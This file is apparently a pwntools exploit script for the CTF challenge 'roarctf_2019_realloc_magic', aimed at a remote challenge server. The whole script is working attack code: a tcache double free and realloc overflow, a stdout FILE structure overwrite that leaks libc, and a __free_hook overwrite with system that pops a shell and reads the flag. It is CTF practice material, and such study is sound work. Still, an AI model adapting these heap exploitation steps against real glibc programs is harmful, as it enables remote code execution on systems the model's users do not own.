from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-27/ld-2.27.so"
libc_path = "/home/fanxinli/libc-so/libc-2.27-64.so"
# p = process([ld_path, "./roarctf_2019_realloc_magic"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 27785)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x, timeout=0.1)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def realloc(size, con):
    sa(">> ", "1")
    sa("Size?", str(size))
    sa("Content?", con)

def free():
    sa(">> ", "2")

def back():
    sa(">> ", "666")


# double free + realloc

# free to unsorted bin
realloc(0x80, "a")
realloc(0, "a")
realloc(0x90, "a")
realloc(0, "a")
realloc(0x10, "a")
realloc(0, "a")
realloc(0x90, "a")
for i in range(7):
    free()

realloc(0, "a")   # realloc_ptr --> NULL && chunk to unsorted bin

# chang fd to stdout
# the first number "8" in "0x8760" need to guess, the chance is 1/16
realloc(0x80, "a")
pad = cyclic(0x80)+p64(0)+p64(0x41)+p16(0x8760)
realloc(0x80+0xa0, pad)  # chunk overflow
realloc(0, "a")          # free

# alloc to stdout
realloc(0x90, "a")
realloc(0, "a")
pad = p64(0xfbad1800)+p64(0)*3+p8(0x58)
realloc(0x90, pad)
# leak libc
info = u64(ru("\x7f")[-6:].ljust(8, b"\x00"))
print("leak: ", hex(info))

# count
libc = ELF(libc_path)
base = info-libc.sym["_IO_file_jumps"]
print("base: ", hex(base))
system = base+libc.sym["system"]
free_hook = base+libc.sym["__free_hook"]


# do it again 
back()     # realloc_ptr --> NULL
realloc(0xa0, "a")
realloc(0, "a")
realloc(0xb0, "a")
realloc(0, "a")
realloc(0xc0, "a")
realloc(0, "a")

realloc(0xb0, "a")
for i in range(7):
    free()
realloc(0, "a")

# alloc to free_hook-0x8 and change it to "/bin/sh;"+p64(system) 
realloc(0xa0, "a")
pad = cyclic(0xa0)+p64(0)+p64(0x41)+p16(free_hook & 0xffff - 0x8)
realloc(0xa0+0xc0, pad)
realloc(0, "a")

realloc(0xb0, "a")
realloc(0, "a")
realloc(0xb0, b"/bin/sh;"+p64(system))

# attack
free()

sl("cat flag")
shell()


